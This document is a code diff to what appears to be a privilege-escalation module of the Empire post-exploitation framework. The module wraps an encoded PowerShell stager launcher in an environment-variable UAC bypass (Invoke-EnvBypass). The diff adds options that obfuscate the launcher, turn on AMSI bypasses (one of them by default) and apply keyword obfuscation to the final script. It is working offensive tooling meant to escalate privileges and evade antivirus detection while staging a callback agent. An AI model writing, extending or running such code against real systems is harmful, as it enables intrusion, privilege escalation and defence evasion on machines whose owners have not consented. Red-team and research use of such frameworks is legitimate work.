@@ -1,7 +1,10 @@
 from __future__ import print_function
-from builtins import str
+
 from builtins import object
+from builtins import str
+
 from lib.common import helpers
+
 
 class Module(object):
 
@@ -51,6 +54,26 @@ class Module(object):
                 'Required'      :   True,
                 'Value'         :   ''
             },
+            'Obfuscate': {
+                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required': False,
+                'Value': 'False'
+            },
+            'ObfuscateCommand': {
+                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required': False,
+                'Value': r'Token\All\1'
+            },
+            'AMSIBypass': {
+                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'True'
+            },
+            'AMSIBypass2': {
+                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'False'
+            },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                 'Required'      :   False,
@@ -80,6 +103,10 @@ class Module(object):
 
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
+        # Set booleans to false by default
+        Obfuscate = False
+        AMSIBypass = False
+        AMSIBypass2 = False
 
         listenerName = self.options['Listener']['Value']
 
@@ -87,6 +114,13 @@ class Module(object):
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
+        if (self.options['Obfuscate']['Value']).lower() == 'true':
+            Obfuscate = True
+        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
+        if (self.options['AMSIBypass']['Value']).lower() == 'true':
+            AMSIBypass = True
+        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
+            AMSIBypass2 = True
 
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Invoke-EnvBypass.ps1"
@@ -108,11 +142,14 @@ class Module(object):
             return ""
         else:
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, obfuscate=Obfuscate,
+                                                               obfuscationCommand=ObfuscateCommand, userAgent=userAgent, proxy=proxy,
+                                                               proxyCreds=proxyCreds, AMSIBypass=AMSIBypass, AMSIBypass2=AMSIBypass2)
             encScript = launcher.split(" ")[-1]
             if launcher == "":
                 print(helpers.color("[!] Error in launcher generation."))
                 return ""
             else:
                 script += "Invoke-EnvBypass -Command \"%s\"" % (encScript)
+                script = helpers.keyword_obfuscation(script)
                 return script
